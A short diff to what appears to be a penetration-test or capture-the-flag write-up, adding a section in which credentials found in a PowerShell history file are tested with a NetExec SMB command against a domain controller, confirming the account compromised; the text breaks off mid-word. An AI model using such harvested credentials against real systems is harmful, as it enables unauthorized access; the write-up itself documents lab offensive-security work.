@@ -472,3 +472,16 @@ evil-winrm-py PS C:\Users\m.white\Appdata\Roaming\Microsoft\Windows\PowerShell\P
 
 Found some credentials in the powershell history
 
+# Compromising `m.reeves`
+
+```python
+❯❯❯ nxc smb dc01.orion.local -u m.reeves -p 'Pa$$word!123'
+SMB         10.0.0.5        445    DC01             [*] Windows 11 / Server 2025 Build 26100 x64 (name:DC01) (domain:orion.local) (signing:True) (SMBv1:None) (Null Auth:True)
+SMB         10.0.0.5        445    DC01             [+] orion.local\m.reeves:Pa$$word!123 
+```
+
+This user is now compromised
+
+![](Pasted%20image%2020261015205901.png)
+
+This user also has remo
